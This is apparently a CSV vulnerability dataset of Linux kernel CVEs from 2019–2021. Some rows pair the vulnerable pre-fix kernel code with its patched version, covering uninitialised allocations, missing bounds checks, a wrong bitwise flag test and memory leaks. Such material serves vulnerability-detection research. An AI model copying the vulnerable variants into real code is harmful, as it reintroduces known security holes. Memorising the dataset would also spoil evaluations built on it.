2020,Overflow ,CVE-2020-10942,,
2020,,CVE-2020-10781,,
2021,,CVE-2020-10774,,
2020,#NAME?,CVE-2020-10773,,
2020,,CVE-2020-10768,,
2020,,CVE-2020-10767,,
2020,,CVE-2020-10766,,
2020,Overflow ,CVE-2020-10757,,
2021,Overflow ,CVE-2020-10742,,
2020,,CVE-2020-10732,"		    (!regset->active || regset->active(t->task, regset) > 0)) {
 int ret;
 size_t size = regset_size(t->task, regset);
 void *data = kmalloc(size, GFP_KERNEL);
 if (unlikely(!data))
 return 0;
			ret = regset->get(t->task, regset,
","		    (!regset->active || regset->active(t->task, regset) > 0)) {
 int ret;
 size_t size = regset_size(t->task, regset);
 void *data = kzalloc(size, GFP_KERNEL);
 if (unlikely(!data))
 return 0;
			ret = regset->get(t->task, regset,
"
2020,,CVE-2020-10720,,
2020,DoS ,CVE-2020-10711,,
2020,,CVE-2020-10690,,
2020,Overflow Mem. Corr. ,CVE-2020-9391,,
2020,,CVE-2020-9383,"/* selects the fdc and drive, and enables the fdc's input/dma. */
static void set_fdc(int drive)
{


 if (drive >= 0 && drive < N_DRIVE) {
 fdc = FDC(drive);
		current_drive = drive;
	}
 if (fdc != 1 && fdc != 0) {
 pr_info(""bad fdc value\n"");
 return;
	}

 set_dor(fdc, ~0, 8);
#if N_FDC > 1
 set_dor(1 - fdc, ~8, 0);
","/* selects the fdc and drive, and enables the fdc's input/dma. */
static void set_fdc(int drive)
{
 unsigned int new_fdc = fdc;

 if (drive >= 0 && drive < N_DRIVE) {
 new_fdc = FDC(drive);
		current_drive = drive;
	}
 if (new_fdc >= N_FDC) {
 pr_info(""bad fdc value\n"");
 return;
	}
	fdc = new_fdc;
 set_dor(fdc, ~0, 8);
#if N_FDC > 1
 set_dor(1 - fdc, ~8, 0);
"
2020,DoS ,CVE-2020-8992,,
2020,Overflow ,CVE-2020-8835,,
2020,,CVE-2020-8649,,
2020,,CVE-2020-8648,,
2020,,CVE-2020-8647,,
2020,DoS +Info ,CVE-2020-8428," * may_create_in_sticky - Check whether an O_CREAT open in a sticky directory
 *			  should be allowed, or not, on files that already
 *			  exist.
 * @dir: the sticky parent directory

 * @inode: the inode of the file to open
 *
 * Block an O_CREAT open of a FIFO (or a regular file) when:
 *
 * Returns 0 if the open is allowed, -ve on error.
 */
static int may_create_in_sticky(struct dentry * const dir,
 struct inode * const inode)
{
 if ((!sysctl_protected_fifos && S_ISFIFO(inode->i_mode)) ||
	    (!sysctl_protected_regular && S_ISREG(inode->i_mode)) ||
 likely(!(dir->d_inode->i_mode & S_ISVTX)) ||
 uid_eq(inode->i_uid, dir->d_inode->i_uid) ||
 uid_eq(current_fsuid(), inode->i_uid))
 return 0;

 if (likely(dir->d_inode->i_mode & 0002) ||
	    (dir->d_inode->i_mode & 0020 &&
	     ((sysctl_protected_fifos >= 2 && S_ISFIFO(inode->i_mode)) ||
	      (sysctl_protected_regular >= 2 && S_ISREG(inode->i_mode))))) {
 const char *operation = S_ISFIFO(inode->i_mode) ?
 struct file *file, const struct open_flags *op)
{
 struct dentry *dir = nd->path.dentry;


 int open_flag = op->open_flag;
 bool will_truncate = (open_flag & O_TRUNC) != 0;
 bool got_write = false;
		error = -EISDIR;
 if (d_is_dir(nd->path.dentry))
 goto out;
		error = may_create_in_sticky(dir,
 d_backing_inode(nd->path.dentry));
 if (unlikely(error))
 goto out;
"," * may_create_in_sticky - Check whether an O_CREAT open in a sticky directory
 *			  should be allowed, or not, on files that already
 *			  exist.
 * @dir_mode: mode bits of directory
 * @dir_uid: owner of directory
 * @inode: the inode of the file to open
 *
 * Block an O_CREAT open of a FIFO (or a regular file) when:
 *
 * Returns 0 if the open is allowed, -ve on error.
 */
static int may_create_in_sticky(umode_t dir_mode, kuid_t dir_uid,
 struct inode * const inode)
{
 if ((!sysctl_protected_fifos && S_ISFIFO(inode->i_mode)) ||
	    (!sysctl_protected_regular && S_ISREG(inode->i_mode)) ||
 likely(!(dir_mode & S_ISVTX)) ||
 uid_eq(inode->i_uid, dir_uid) ||
 uid_eq(current_fsuid(), inode->i_uid))
 return 0;

 if (likely(dir_mode & 0002) ||
	    (dir_mode & 0020 &&
	     ((sysctl_protected_fifos >= 2 && S_ISFIFO(inode->i_mode)) ||
	      (sysctl_protected_regular >= 2 && S_ISREG(inode->i_mode))))) {
 const char *operation = S_ISFIFO(inode->i_mode) ?
 struct file *file, const struct open_flags *op)
{
 struct dentry *dir = nd->path.dentry;
 kuid_t dir_uid = dir->d_inode->i_uid;
 umode_t dir_mode = dir->d_inode->i_mode;
 int open_flag = op->open_flag;
 bool will_truncate = (open_flag & O_TRUNC) != 0;
 bool got_write = false;
		error = -EISDIR;
 if (d_is_dir(nd->path.dentry))
 goto out;
		error = may_create_in_sticky(dir_mode, dir_uid,
 d_backing_inode(nd->path.dentry));
 if (unlikely(error))
 goto out;
"
2020,,CVE-2020-7053,,
2020,,CVE-2020-1749,,
2021,,CVE-2019-25045,,
2021,Exec Code ,CVE-2019-25044,,
2020,,CVE-2019-20934,,
2020,Bypass ,CVE-2019-20908,,
2020,DoS ,CVE-2019-20812,,
2020,,CVE-2019-20811,,
2020,,CVE-2019-20810,,
2020,DoS ,CVE-2019-20806,"	input->vb = NULL;
 spin_unlock_irqrestore(&input->slock, flags);

	v4l2_buf = to_vb2_v4l2_buffer(&vb->vb.vb2_buf);

 if (!vb) { /* Gone because of disabling */
 dev_dbg(&dev->pci->dev, ""vb is empty, dropping frame\n"");
 return;
	}



 /*
	 * Check for space.
	 * Mind the overhead of startcode emulation prevention.
","	input->vb = NULL;
 spin_unlock_irqrestore(&input->slock, flags);



 if (!vb) { /* Gone because of disabling */
 dev_dbg(&dev->pci->dev, ""vb is empty, dropping frame\n"");
 return;
	}

	v4l2_buf = to_vb2_v4l2_buffer(&vb->vb.vb2_buf);

 /*
	 * Check for space.
	 * Mind the overhead of startcode emulation prevention.
"
2020,,CVE-2019-20794,,
2020,,CVE-2019-20636,"		}
	}

 __clear_bit(*old_keycode, dev->keybit);
 __set_bit(ke->keycode, dev->keybit);

 for (i = 0; i < dev->keycodemax; i++) {
 if (input_fetch_keycode(dev, i) == *old_keycode) {
 __set_bit(*old_keycode, dev->keybit);
 break; /* Setting the bit twice is useless, so break */

		}
	}


 return 0;
}

	 * Simulate keyup event if keycode is not present
	 * in the keymap anymore
 */
 if (test_bit(EV_KEY, dev->evbit) &&
	    !is_event_supported(old_keycode, dev->keybit, KEY_MAX) &&
 __test_and_clear_bit(old_keycode, dev->key)) {




 struct input_value vals[] =  {
			{ EV_KEY, old_keycode, 0 },
			input_value_sync
","		}
	}

 if (*old_keycode <= KEY_MAX) {
 __clear_bit(*old_keycode, dev->keybit);
 for (i = 0; i < dev->keycodemax; i++) {
 if (input_fetch_keycode(dev, i) == *old_keycode) {
 __set_bit(*old_keycode, dev->keybit);
 /* Setting the bit twice is useless, so break */
 break;
			}
		}
	}

 __set_bit(ke->keycode, dev->keybit);
 return 0;
}

	 * Simulate keyup event if keycode is not present
	 * in the keymap anymore
 */
 if (old_keycode > KEY_MAX) {
 dev_warn(dev->dev.parent ?: &dev->dev,
 ""%s: got too big old keycode %#x\n"",
			 __func__, old_keycode);
	} else if (test_bit(EV_KEY, dev->evbit) &&
		   !is_event_supported(old_keycode, dev->keybit, KEY_MAX) &&
 __test_and_clear_bit(old_keycode, dev->key)) {
 struct input_value vals[] =  {
			{ EV_KEY, old_keycode, 0 },
			input_value_sync
"
2020,,CVE-2019-20422," if (rt->dst.error == -EAGAIN) {
 ip6_rt_put_flags(rt, flags);
		rt = net->ipv6.ip6_null_entry;
 if (!(flags | RT6_LOOKUP_F_DST_NOREF))
 dst_hold(&rt->dst);
	}

"," if (rt->dst.error == -EAGAIN) {
 ip6_rt_put_flags(rt, flags);
		rt = net->ipv6.ip6_null_entry;
 if (!(flags & RT6_LOOKUP_F_DST_NOREF))
 dst_hold(&rt->dst);
	}

"
2019,DoS ,CVE-2019-20096,,
2019,DoS ,CVE-2019-20095,,
2019,,CVE-2019-20054,,
2019,DoS ,CVE-2019-19966,,
2019,,CVE-2019-19965,,
2019,#NAME?,CVE-2019-19947," struct kvaser_cmd *cmd;
 int err;

	cmd = kmalloc(sizeof(*cmd), GFP_ATOMIC);
 if (!cmd)
 return -ENOMEM;

 struct kvaser_cmd *cmd;
 int rc;

	cmd = kmalloc(sizeof(*cmd), GFP_KERNEL);
 if (!cmd)
 return -ENOMEM;

 struct kvaser_cmd *cmd;
 int rc;

	cmd = kmalloc(sizeof(*cmd), GFP_KERNEL);
 if (!cmd)
 return -ENOMEM;

"," struct kvaser_cmd *cmd;
 int err;

	cmd = kzalloc(sizeof(*cmd), GFP_ATOMIC);
 if (!cmd)
 return -ENOMEM;

 struct kvaser_cmd *cmd;
 int rc;

	cmd = kzalloc(sizeof(*cmd), GFP_KERNEL);
 if (!cmd)
 return -ENOMEM;

 struct kvaser_cmd *cmd;
 int rc;

	cmd = kzalloc(sizeof(*cmd), GFP_KERNEL);
 if (!cmd)
 return -ENOMEM;

"
2019,,CVE-2019-19927,"			}

#ifdef CONFIG_TRANSPARENT_HUGEPAGE
 if (!(flags & TTM_PAGE_FLAG_DMA32)) {

 for (j = 0; j < HPAGE_PMD_NR; ++j)
 if (p++ != pages[i + j])
 break;
 unsigned max_size, n2free;

 spin_lock_irqsave(&huge->lock, irq_flags);
 while (i < npages) {
 struct page *p = pages[i];
 unsigned j;

","			}

#ifdef CONFIG_TRANSPARENT_HUGEPAGE
 if (!(flags & TTM_PAGE_FLAG_DMA32) &&
			    (npages - i) >= HPAGE_PMD_NR) {
 for (j = 0; j < HPAGE_PMD_NR; ++j)
 if (p++ != pages[i + j])
 break;
 unsigned max_size, n2free;

 spin_lock_irqsave(&huge->lock, irq_flags);
 while ((npages - i) >= HPAGE_PMD_NR) {
 struct page *p = pages[i];
 unsigned j;

"
2019,DoS ,CVE-2019-19922,"specification of the maximum CPU bandwidth available to a group or hierarchy.

The bandwidth allowed for a group is specified using a quota and period. Within
each given ""period"" (microseconds), a group is allowed to consume only up to
""quota"" microseconds of CPU time.  When the CPU bandwidth consumption of a
group exceeds this limit (for that period), the tasks belonging to its
hierarchy will be throttled and are not allowed to run again until the next
period.

A group's unused runtime is globally tracked, being refreshed with quota units
above at each period boundary.  As threads consume this bandwidth it is
transferred to cpu-local ""silos"" on a demand basis.  The amount transferred

within each of these updates is tunable and described as the ""slice"".

Management

A value of -1 for cpu.cfs_quota_us indicates that the group does not have any
bandwidth restriction in place, such a group is described as an unconstrained
bandwidth group.  This represents the traditional work-conserving behavior for
CFS.

Writing any (valid) positive value(s) will enact the specified bandwidth limit.
The minimum quota allowed for the quota or period is 1ms.  There is also an
upper bound on the period length of 1s.  Additional restrictions exist when
bandwidth limits are used in a hierarchical fashion, these are explained in
more detail below.

System wide settings
--------------------
For efficiency run-time is transferred between the global pool and CPU local
""silos"" in a batch fashion.  This greatly reduces global accounting pressure
on large systems.  The amount transferred each time such an update is required
is described as the ""slice"".

This is tunable via procfs::
In case b) above, even though the child may have runtime remaining it will not
be allowed to until the parent's runtime is refreshed.














































Examples
--------
1. Limit a group to 1 CPU worth of runtime::

	now = sched_clock_cpu(smp_processor_id());
	cfs_b->runtime = cfs_b->quota;
	cfs_b->runtime_expires = now + ktime_to_ns(cfs_b->period);
	cfs_b->expires_seq++;
}

static inline struct cfs_bandwidth *tg_cfs_bandwidth(struct task_group *tg)
{
 struct task_group *tg = cfs_rq->tg;
 struct cfs_bandwidth *cfs_b = tg_cfs_bandwidth(tg);
	u64 amount = 0, min_amount, expires;
 int expires_seq;

 /* note: this is a positive sum as runtime_remaining <= 0 */
	min_amount = sched_cfs_bandwidth_slice() - cfs_rq->runtime_remaining;
			cfs_b->idle = 0;
		}
	}
	expires_seq = cfs_b->expires_seq;
	expires = cfs_b->runtime_expires;
 raw_spin_unlock(&cfs_b->lock);

	cfs_rq->runtime_remaining += amount;
 /*
	 * we may have advanced our local expiration to account for allowed
	 * spread between our sched_clock and the one on which runtime was
	 * issued.
 */
 if (cfs_rq->expires_seq != expires_seq) {
		cfs_rq->expires_seq = expires_seq;
		cfs_rq->runtime_expires = expires;
	}

 return cfs_rq->runtime_remaining > 0;
}

/*
 * Note: This depends on the synchronization provided by sched_clock and the
 * fact that rq->clock snapshots this value.
 */
static void expire_cfs_rq_runtime(struct cfs_rq *cfs_rq)
{
 struct cfs_bandwidth *cfs_b = tg_cfs_bandwidth(cfs_rq->tg);

 /* if the deadline is ahead of our clock, nothing to do */
 if (likely((s64)(rq_clock(rq_of(cfs_rq)) - cfs_rq->runtime_expires) < 0))
 return;

 if (cfs_rq->runtime_remaining < 0)
 return;

 /*
	 * If the local deadline has passed we have to consider the
	 * possibility that our sched_clock is 'fast' and the global deadline
	 * has not truly expired.
	 *
	 * Fortunately we can check determine whether this the case by checking
	 * whether the global deadline(cfs_b->expires_seq) has advanced.
 */
 if (cfs_rq->expires_seq == cfs_b->expires_seq) {
 /* extend local deadline, drift is bounded above by 2 ticks */
		cfs_rq->runtime_expires += TICK_NSEC;
	} else {
 /* global deadline is ahead, expiration has passed */
		cfs_rq->runtime_remaining = 0;
	}
}

static void __account_cfs_rq_runtime(struct cfs_rq *cfs_rq, u64 delta_exec)
{
 /* dock delta_exec before expiring quota (as it could span periods) */
	cfs_rq->runtime_remaining -= delta_exec;
 expire_cfs_rq_runtime(cfs_rq);

 if (likely(cfs_rq->runtime_remaining > 0))
 return;
 resched_curr(rq);
}

static u64 distribute_cfs_runtime(struct cfs_bandwidth *cfs_b,
		u64 remaining, u64 expires)
{
 struct cfs_rq *cfs_rq;
	u64 runtime;
		remaining -= runtime;

		cfs_rq->runtime_remaining += runtime;
		cfs_rq->runtime_expires = expires;

 /* we check whether we're throttled above */
 if (cfs_rq->runtime_remaining > 0)
 */
static int do_sched_cfs_period_timer(struct cfs_bandwidth *cfs_b, int overrun, unsigned long flags)
{
	u64 runtime, runtime_expires;
 int throttled;

 /* no need to continue the timer with no bandwidth constraint */
 /* account preceding periods in which throttling occurred */
	cfs_b->nr_throttled += overrun;

	runtime_expires = cfs_b->runtime_expires;

 /*
	 * This check is repeated as we are holding onto the new bandwidth while
	 * we unthrottle. This can potentially race with an unthrottled group
		cfs_b->distribute_running = 1;
 raw_spin_unlock_irqrestore(&cfs_b->lock, flags);
 /* we can't nest cfs_b->lock while distributing bandwidth */
		runtime = distribute_cfs_runtime(cfs_b, runtime,
						 runtime_expires);
 raw_spin_lock_irqsave(&cfs_b->lock, flags);

		cfs_b->distribute_running = 0;
 return;

 raw_spin_lock(&cfs_b->lock);
 if (cfs_b->quota != RUNTIME_INF &&
	    cfs_rq->runtime_expires == cfs_b->runtime_expires) {
		cfs_b->runtime += slack_runtime;

 /* we are under rq->lock, defer unthrottling using a timer */
{
	u64 runtime = 0, slice = sched_cfs_bandwidth_slice();
 unsigned long flags;
	u64 expires;

 /* confirm we're still not at a refresh boundary */
 raw_spin_lock_irqsave(&cfs_b->lock, flags);
 if (cfs_b->quota != RUNTIME_INF && cfs_b->runtime > slice)
		runtime = cfs_b->runtime;

	expires = cfs_b->runtime_expires;
 if (runtime)
		cfs_b->distribute_running = 1;

 if (!runtime)
 return;

	runtime = distribute_cfs_runtime(cfs_b, runtime, expires);

 raw_spin_lock_irqsave(&cfs_b->lock, flags);
 if (expires == cfs_b->runtime_expires)
 lsub_positive(&cfs_b->runtime, runtime);
	cfs_b->distribute_running = 0;
 raw_spin_unlock_irqrestore(&cfs_b->lock, flags);
}

	cfs_b->period_active = 1;
	overrun = hrtimer_forward_now(&cfs_b->period_timer, cfs_b->period);
	cfs_b->runtime_expires += (overrun + 1) * ktime_to_ns(cfs_b->period);
	cfs_b->expires_seq++;
 hrtimer_start_expires(&cfs_b->period_timer, HRTIMER_MODE_ABS_PINNED);
}

	u64			quota;
	u64			runtime;
	s64			hierarchical_quota;
	u64			runtime_expires;
 int			expires_seq;

	u8			idle;
	u8			period_active;

#ifdef CONFIG_CFS_BANDWIDTH
 int			runtime_enabled;
 int			expires_seq;
	u64			runtime_expires;
	s64			runtime_remaining;

	u64			throttled_clock;
","specification of the maximum CPU bandwidth available to a group or hierarchy.

The bandwidth allowed for a group is specified using a quota and period. Within
each given ""period"" (microseconds), a task group is allocated up to ""quota""
microseconds of CPU time. That quota is assigned to per-cpu run queues in
slices as threads in the cgroup become runnable. Once all quota has been
assigned any additional requests for quota will result in those threads being
throttled. Throttled threads will not be able to run again until the next
period when the quota is replenished.

A group's unassigned quota is globally tracked, being refreshed back to
cfs_quota units at each period boundary. As threads consume this bandwidth it
is transferred to cpu-local ""silos"" on a demand basis. The amount transferred
within each of these updates is tunable and described as the ""slice"".

Management

A value of -1 for cpu.cfs_quota_us indicates that the group does not have any
bandwidth restriction in place, such a group is described as an unconstrained
bandwidth group. This represents the traditional work-conserving behavior for
CFS.

Writing any (valid) positive value(s) will enact the specified bandwidth limit.
The minimum quota allowed for the quota or period is 1ms. There is also an
upper bound on the period length of 1s. Additional restrictions exist when
bandwidth limits are used in a hierarchical fashion, these are explained in
more detail below.

System wide settings
--------------------
For efficiency run-time is transferred between the global pool and CPU local
""silos"" in a batch fashion. This greatly reduces global accounting pressure
on large systems. The amount transferred each time such an update is required
is described as the ""slice"".

This is tunable via procfs::
In case b) above, even though the child may have runtime remaining it will not
be allowed to until the parent's runtime is refreshed.

CFS Bandwidth Quota Caveats
---------------------------
Once a slice is assigned to a cpu it does not expire.  However all but 1ms of
the slice may be returned to the global pool if all threads on that cpu become
unrunnable. This is configured at compile time by the min_cfs_rq_runtime
variable. This is a performance tweak that helps prevent added contention on
the global lock.

The fact that cpu-local slices do not expire results in some interesting corner
cases that should be understood.

For cgroup cpu constrained applications that are cpu limited this is a
relatively moot point because they will naturally consume the entirety of their
quota as well as the entirety of each cpu-local slice in each period. As a
result it is expected that nr_periods roughly equal nr_throttled, and that
cpuacct.usage will increase roughly equal to cfs_quota_us in each period.

For highly-threaded, non-cpu bound applications this non-expiration nuance
allows applications to briefly burst past their quota limits by the amount of
unused slice on each cpu that the task group is running on (typically at most
1ms per cpu or as defined by min_cfs_rq_runtime).  This slight burst only
applies if quota had been assigned to a cpu and then not fully used or returned
in previous periods. This burst amount will not be transferred between cores.
As a result, this mechanism still strictly limits the task group to quota
average usage, albeit over a longer time window than a single period.  This
also limits the burst ability to no more than 1ms per cpu.  This provides
better more predictable user experience for highly threaded applications with
small quota limits on high core count machines. It also eliminates the
propensity to throttle these applications while simultanously using less than
quota amounts of cpu. Another way to say this, is that by allowing the unused
portion of a slice to remain valid across periods we have decreased the
possibility of wastefully expiring quota on cpu-local silos that don't need a
full slice's amount of cpu time.

The interaction between cpu-bound and non-cpu-bound-interactive applications
should also be considered, especially when single core usage hits 100%. If you
gave each of these applications half of a cpu-core and they both got scheduled
on the same CPU it is theoretically possible that the non-cpu bound application
will use up to 1ms additional quota in some periods, thereby preventing the
cpu-bound application from fully using its quota by that same amount. In these
instances it will be up to the CFS algorithm (see sched-design-CFS.rst) to
decide which application is chosen to run, as they will both be runnable and
have remaining quota. This runtime discrepancy will be made up in the following
periods when the interactive application idles.

Examples
--------
1. Limit a group to 1 CPU worth of runtime::

	now = sched_clock_cpu(smp_processor_id());
	cfs_b->runtime = cfs_b->quota;


}

static inline struct cfs_bandwidth *tg_cfs_bandwidth(struct task_group *tg)
{
 struct task_group *tg = cfs_rq->tg;
 struct cfs_bandwidth *cfs_b = tg_cfs_bandwidth(tg);
	u64 amount = 0, min_amount;


 /* note: this is a positive sum as runtime_remaining <= 0 */
	min_amount = sched_cfs_bandwidth_slice() - cfs_rq->runtime_remaining;
			cfs_b->idle = 0;
		}
	}


 raw_spin_unlock(&cfs_b->lock);

	cfs_rq->runtime_remaining += amount;










 return cfs_rq->runtime_remaining > 0;
}

































static void __account_cfs_rq_runtime(struct cfs_rq *cfs_rq, u64 delta_exec)
{
 /* dock delta_exec before expiring quota (as it could span periods) */
	cfs_rq->runtime_remaining -= delta_exec;


 if (likely(cfs_rq->runtime_remaining > 0))
 return;
 resched_curr(rq);
}

static u64 distribute_cfs_runtime(struct cfs_bandwidth *cfs_b, u64 remaining)

{
 struct cfs_rq *cfs_rq;
	u64 runtime;
		remaining -= runtime;

		cfs_rq->runtime_remaining += runtime;


 /* we check whether we're throttled above */
 if (cfs_rq->runtime_remaining > 0)
 */
static int do_sched_cfs_period_timer(struct cfs_bandwidth *cfs_b, int overrun, unsigned long flags)
{
	u64 runtime;
 int throttled;

 /* no need to continue the timer with no bandwidth constraint */
 /* account preceding periods in which throttling occurred */
	cfs_b->nr_throttled += overrun;



 /*
	 * This check is repeated as we are holding onto the new bandwidth while
	 * we unthrottle. This can potentially race with an unthrottled group
		cfs_b->distribute_running = 1;
 raw_spin_unlock_irqrestore(&cfs_b->lock, flags);
 /* we can't nest cfs_b->lock while distributing bandwidth */
		runtime = distribute_cfs_runtime(cfs_b, runtime);

 raw_spin_lock_irqsave(&cfs_b->lock, flags);

		cfs_b->distribute_running = 0;
 return;

 raw_spin_lock(&cfs_b->lock);
 if (cfs_b->quota != RUNTIME_INF) {

		cfs_b->runtime += slack_runtime;

 /* we are under rq->lock, defer unthrottling using a timer */
{
	u64 runtime = 0, slice = sched_cfs_bandwidth_slice();
 unsigned long flags;


 /* confirm we're still not at a refresh boundary */
 raw_spin_lock_irqsave(&cfs_b->lock, flags);
 if (cfs_b->quota != RUNTIME_INF && cfs_b->runtime > slice)
		runtime = cfs_b->runtime;


 if (runtime)
		cfs_b->distribute_running = 1;

 if (!runtime)
 return;

	runtime = distribute_cfs_runtime(cfs_b, runtime);

 raw_spin_lock_irqsave(&cfs_b->lock, flags);
 lsub_positive(&cfs_b->runtime, runtime);

	cfs_b->distribute_running = 0;
 raw_spin_unlock_irqrestore(&cfs_b->lock, flags);
}

	cfs_b->period_active = 1;
	overrun = hrtimer_forward_now(&cfs_b->period_timer, cfs_b->period);


 hrtimer_start_expires(&cfs_b->period_timer, HRTIMER_MODE_ABS_PINNED);
}

	u64			quota;
	u64			runtime;
	s64			hierarchical_quota;



	u8			idle;
	u8			period_active;

#ifdef CONFIG_CFS_BANDWIDTH
 int			runtime_enabled;


	s64			runtime_remaining;

	u64			throttled_clock;
"
2019,,CVE-2019-19816,,
2019,,CVE-2019-19815,,
2019,,CVE-2019-19814,,
2019,,CVE-2019-19813,,
2019,,CVE-2019-19807," goto unlock;
	}
 if (!list_empty(&timer->open_list_head)) {
		timeri = list_entry(timer->open_list_head.next,

 struct snd_timer_instance, open_list);
 if (timeri->flags & SNDRV_TIMER_IFLG_EXCLUSIVE) {
			err = -EBUSY;
			timeri = NULL;
 goto unlock;
		}
	}
"," goto unlock;
	}
 if (!list_empty(&timer->open_list_head)) {
 struct snd_timer_instance *t =
 list_entry(timer->open_list_head.next,
 struct snd_timer_instance, open_list);
 if (t->flags & SNDRV_TIMER_IFLG_EXCLUSIVE) {
			err = -EBUSY;

 goto unlock;
		}
	}
"
2019,,CVE-2019-19770,,
2019,,CVE-2019-19769,,
2019,,CVE-2019-19768,,
2019,,CVE-2019-19767,"{
 struct ext4_inode *raw_inode;
 struct ext4_xattr_ibody_header *header;


 int error;














	raw_inode = ext4_raw_inode(iloc);

	header = IHDR(inode, raw_inode);
{
 struct ext4_sb_info *sbi = EXT4_SB(sb);
 struct ext4_super_block *es = sbi->s_es;



 /* determine the minimum size of new large inodes, if present */
 if (sbi->s_inode_size > EXT4_GOOD_OLD_INODE_SIZE &&
	    sbi->s_want_extra_isize == 0) {
		sbi->s_want_extra_isize = sizeof(struct ext4_inode) -
						     EXT4_GOOD_OLD_INODE_SIZE;

 if (ext4_has_feature_extra_isize(sb)) {
 if (sbi->s_want_extra_isize <
 le16_to_cpu(es->s_want_extra_isize))
		}
	}
 /* Check if enough inode space is available */
 if (EXT4_GOOD_OLD_INODE_SIZE + sbi->s_want_extra_isize >
  sbi->s_inode_size) {
		sbi->s_want_extra_isize = sizeof(struct ext4_inode) -
 				       EXT4_GOOD_OLD_INODE_SIZE;
 ext4_msg(sb, KERN_INFO,
 ""required extra inode space not available"");
	}
","{
 struct ext4_inode *raw_inode;
 struct ext4_xattr_ibody_header *header;
 unsigned int inode_size = EXT4_INODE_SIZE(inode->i_sb);
 struct ext4_inode_info *ei = EXT4_I(inode);
 int error;

 /* this was checked at iget time, but double check for good measure */
 if ((EXT4_GOOD_OLD_INODE_SIZE + ei->i_extra_isize > inode_size) ||
	    (ei->i_extra_isize & 3)) {
 EXT4_ERROR_INODE(inode, ""bad extra_isize %u (inode size %u)"",
				 ei->i_extra_isize,
 EXT4_INODE_SIZE(inode->i_sb));
 return -EFSCORRUPTED;
	}
 if ((new_extra_isize < ei->i_extra_isize) ||
	    (new_extra_isize < 4) ||
	    (new_extra_isize > inode_size - EXT4_GOOD_OLD_INODE_SIZE))
 return -EINVAL;	/* Should never happen */

	raw_inode = ext4_raw_inode(iloc);

	header = IHDR(inode, raw_inode);
{
 struct ext4_sb_info *sbi = EXT4_SB(sb);
 struct ext4_super_block *es = sbi->s_es;
 unsigned def_extra_isize = sizeof(struct ext4_inode) -
						EXT4_GOOD_OLD_INODE_SIZE;

 if (sbi->s_inode_size == EXT4_GOOD_OLD_INODE_SIZE) {
		sbi->s_want_extra_isize = 0;
 return;
	}
 if (sbi->s_want_extra_isize < 4) {
		sbi->s_want_extra_isize = def_extra_isize;
 if (ext4_has_feature_extra_isize(sb)) {
 if (sbi->s_want_extra_isize <
 le16_to_cpu(es->s_want_extra_isize))
		}
	}
 /* Check if enough inode space is available */
 if ((sbi->s_want_extra_isize > sbi->s_inode_size) ||
     (EXT4_GOOD_OLD_INODE_SIZE + sbi->s_want_extra_isize >
  sbi->s_inode_size)) {
 sbi->s_want_extra_isize = def_extra_isize;
 ext4_msg(sb, KERN_INFO,
 ""required extra inode space not available"");
	}
"
2019,DoS Overflow Mem. Corr. ,CVE-2019-19602,"
static inline int fpregs_state_valid(struct fpu *fpu, unsigned int cpu)
{
 return fpu == this_cpu_read_stable(fpu_fpregs_owner_ctx) && cpu == fpu->last_cpu;
}

/*
","
static inline int fpregs_state_valid(struct fpu *fpu, unsigned int cpu)
{
 return fpu == this_cpu_read(fpu_fpregs_owner_ctx) && cpu == fpu->last_cpu;
}

/*
"
2019,,CVE-2019-19543,,
2019,,CVE-2019-19537,,
2019,,CVE-2019-19536,,
2019,#NAME?,CVE-2019-19535,,
2019,,CVE-2019-19534,,
2019,,CVE-2019-19533,,
2019,,CVE-2019-19532,,
2019,,CVE-2019-19531,,
2019,,CVE-2019-19530,,
2019,,CVE-2019-19529,,
2019,,CVE-2019-19528,,
2019,,CVE-2019-19527,,
2019,,CVE-2019-19526,,
2019,,CVE-2019-19525,,
2019,,CVE-2019-19524,,
2019,,CVE-2019-19523,,
2019,DoS ,CVE-2019-19462,,
2019,,CVE-2019-19449,,
2019,,CVE-2019-19448,,
2019,,CVE-2019-19447,,
2019,,CVE-2019-19378,,
2019,,CVE-2019-19377,,
2020,,CVE-2019-19338,,
2020,DoS ,CVE-2019-19332,,
2019,,CVE-2019-19319,,
2019,,CVE-2019-19318,,
2019,,CVE-2019-19252,,
2019,Bypass ,CVE-2019-19241,,
2019,DoS ,CVE-2019-19227,,
2019,DoS ,CVE-2019-19083," return &clk_src->base;
	}


 BREAK_TO_DEBUGGER();
 return NULL;
}
 return &clk_src->base;
	}


 BREAK_TO_DEBUGGER();
 return NULL;
}
 return &clk_src->base;
	}


 BREAK_TO_DEBUGGER();
 return NULL;
}
 return &clk_src->base;
	}


 BREAK_TO_DEBUGGER();
 return NULL;
}
 return &clk_src->base;
	}


 BREAK_TO_DEBUGGER();
 return NULL;
}
 return &clk_src->base;
	}


 BREAK_TO_DEBUGGER();
 return NULL;
}
 return &clk_src->base;
	}


 BREAK_TO_DEBUGGER();
 return NULL;
}
"," return &clk_src->base;
	}

 kfree(clk_src);
 BREAK_TO_DEBUGGER();
 return NULL;
}
 return &clk_src->base;
	}

 kfree(clk_src);
 BREAK_TO_DEBUGGER();
 return NULL;
}
 return &clk_src->base;
	}

 kfree(clk_src);
 BREAK_TO_DEBUGGER();
 return NULL;
}
 return &clk_src->base;
	}

 kfree(clk_src);
 BREAK_TO_DEBUGGER();
 return NULL;
}
 return &clk_src->base;
	}

 kfree(clk_src);
 BREAK_TO_DEBUGGER();
 return NULL;
}
 return &clk_src->base;
	}

 kfree(clk_src);
 BREAK_TO_DEBUGGER();
 return NULL;
}
 return &clk_src->base;
	}

 kfree(clk_src);
 BREAK_TO_DEBUGGER();
 return NULL;
}
"
2019,DoS ,CVE-2019-19082," if (construct(num_virtual_links, dc, pool))
 return &pool->base;


 BREAK_TO_DEBUGGER();
 return NULL;
}
 if (construct(num_virtual_links, dc, pool, asic_id))
 return &pool->base;


 BREAK_TO_DEBUGGER();
 return NULL;
}
 if (construct(num_virtual_links, dc, pool))
 return &pool->base;


 BREAK_TO_DEBUGGER();
 return NULL;
}
 if (construct(num_virtual_links, dc, pool))
 return &pool->base;


 BREAK_TO_DEBUGGER();
 return NULL;
}
 if (construct(init_data->num_virtual_links, dc, pool))
 return &pool->base;


 BREAK_TO_DEBUGGER();
 return NULL;
}
"," if (construct(num_virtual_links, dc, pool))
 return &pool->base;

 kfree(pool);
 BREAK_TO_DEBUGGER();
 return NULL;
}
 if (construct(num_virtual_links, dc, pool, asic_id))
 return &pool->base;

 kfree(pool);
 BREAK_TO_DEBUGGER();
 return NULL;
}
 if (construct(num_virtual_links, dc, pool))
 return &pool->base;

 kfree(pool);
 BREAK_TO_DEBUGGER();
 return NULL;
}
 if (construct(num_virtual_links, dc, pool))
 return &pool->base;

 kfree(pool);
 BREAK_TO_DEBUGGER();
 return NULL;
}
